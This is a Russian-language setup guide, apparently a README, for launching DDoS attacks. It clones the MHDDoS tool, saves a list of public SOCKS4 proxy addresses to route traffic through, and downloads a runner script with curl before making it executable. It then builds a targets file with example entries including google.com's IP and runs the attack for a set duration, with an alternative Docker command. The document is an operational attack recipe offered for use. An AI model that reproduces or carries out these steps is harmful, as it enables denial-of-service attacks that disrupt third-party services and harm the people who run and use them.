1. Установите инструментарий
```
sudo apt-get update
sudo apt-get install -y jq python3-pip python-pyasn1
pip install pyasn1==0.4.6
```

2. Установите на сервере MHDDoS
```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt
```

3. Сохраните прокси лист

```
echo 'socks4://115.239.21.111:23456
socks4://119.3.231.232:8001
socks4://123.56.29.180:10808
socks4://178.237.38.22:13292
socks4://192.252.215.5:16137
socks4://93.190.141.62:9050
socks4://192.252.215.5:16137
socks4://72.195.34.35:27360
socks4://162.14.135.190:10800
socks4://80.75.3.74:1080
socks4://114.88.230.134:1080
socks4://98.162.96.53:10663
socks4://119.3.231.232:8001
socks4://72.195.34.60:27391
socks4://119.3.231.232:8001
socks4://198.8.94.170:4145
socks4://142.93.143.155:9010
socks4://192.252.211.197:14921
socks4://192.111.135.17:18302
socks4://72.195.34.35:27360
socks4://175.24.235.242:7891
socks4://98.162.25.23:4145
socks4://98.162.25.4:31654
socks4://174.77.111.198:49547
socks4://192.111.137.35:4145
socks4://192.111.137.35:4145
socks4://98.162.25.7:31653
socks4://78.47.230.141:17027
socks4://128.199.245.23:24527
socks4://222.212.85.16:7000
socks4://51.222.13.193:10084
socks4://121.205.228.46:8003
socks4://1.14.104.55:15229
socks4://192.111.135.21:4145
socks4://192.111.135.21:4145
socks4://72.195.34.60:27391
socks4://101.35.115.136:20012
socks4://142.93.143.155:9010
socks4://98.162.25.4:31654
socks4://175.24.235.242:7891
socks4://192.111.137.34:18765' > files/proxies/0
 ```

4. установите раннер
```
curl https://raw.githubusercontent.com/rxitech/k6clean/master/runner.sh > runner.sh
```

5. сделайте раннер запускаемым

```
chmod +x ./runner.sh
```

6. Создайте targets.json файл с целями в следующем формате (без запятой после последнего значения!)
```
{
 "127.0.0.1": "localhost",
 "172.217.19.78": "google.com"
}
```

7. Запустите раннер передав файл с целями и продолжительность выполнения в секундах
```
./runner.sh targets.json 300
```

Alternative run command for dockerized version
```bash
docker run -ti --rm -v $(pwd)/targets.json:/app/targets.json k6clean:latest  targets.json 300
```